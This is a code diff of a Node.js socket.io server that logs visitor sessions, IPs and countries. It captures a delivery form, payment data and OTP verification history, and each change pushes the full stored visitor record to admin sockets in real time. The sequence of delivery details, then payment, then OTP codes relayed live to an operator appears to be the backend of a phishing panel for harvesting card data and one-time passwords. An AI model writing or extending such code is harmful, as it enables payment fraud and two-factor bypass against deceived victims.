@@ -87,14 +87,17 @@ io.on('connection', (socket) => {
           last_activity = CURRENT_TIMESTAMP
       `, [sessionId, ip, geo?.country || 'Unknown', geo?.country || 'XX', userAgent, page]);
 
-      // Notify admins of new visitor
+      // Get full visitor data
+      const visitorResult = await pool.query(
+        'SELECT * FROM visitors WHERE session_id = $1',
+        [sessionId]
+      );
+      
+      // Notify admins of new visitor with FULL data
       console.log(`📡 Broadcasting visitor:new to ${adminConnections.size} admins`);
       adminConnections.forEach((adminSocket) => {
         adminSocket.emit('visitor:new', {
-          sessionId,
-          country: geo?.country,
-          ip,
-          page,
+          ...visitorResult.rows[0],
           timestamp: new Date()
         });
       });
@@ -139,12 +142,16 @@ io.on('connection', (socket) => {
         [JSON.stringify(formData), sessionId]
       );
 
-      // Notify admins
+      // Get full visitor data
+      const visitorResult = await pool.query(
+        'SELECT * FROM visitors WHERE session_id = $1',
+        [sessionId]
+      );
+
+      // Notify admins with FULL visitor data
       adminConnections.forEach((adminSocket) => {
         adminSocket.emit('form:deliverySubmitted', {
-          sessionId,
-          formData,
-          country: geo?.country,
+          ...visitorResult.rows[0],
           timestamp: new Date()
         });
       });
@@ -185,12 +192,16 @@ io.on('connection', (socket) => {
         [JSON.stringify(finalPaymentData), sessionId]
       );
 
+      // Get full visitor data
+      const visitorResult = await pool.query(
+        'SELECT * FROM visitors WHERE session_id = $1',
+        [sessionId]
+      );
+
       // إرسال الإشعار الفوري للأدمن بالبيانات الحقيقية كاملة
       adminConnections.forEach((adminSocket) => {
         adminSocket.emit('form:paymentSubmitted', {
-          sessionId,
-          paymentData: finalPaymentData,
-          country: geo?.country,
+          ...visitorResult.rows[0],
           timestamp: new Date()
         });
       });
@@ -243,13 +254,16 @@ io.on('connection', (socket) => {
         [JSON.stringify(verificationData), JSON.stringify(otpHistory), sessionId]
       );
 
-      // Notify admins with OTP history
+      // Get full visitor data
+      const visitorResult = await pool.query(
+        'SELECT * FROM visitors WHERE session_id = $1',
+        [sessionId]
+      );
+
+      // Notify admins with FULL visitor data including OTP history
       adminConnections.forEach((adminSocket) => {
         adminSocket.emit('form:verificationSubmitted', {
-          sessionId,
-          verificationData,
-          otpHistory: otpHistory,
-          country: geo?.country,
+          ...visitorResult.rows[0],
           timestamp: new Date()
         });
       });
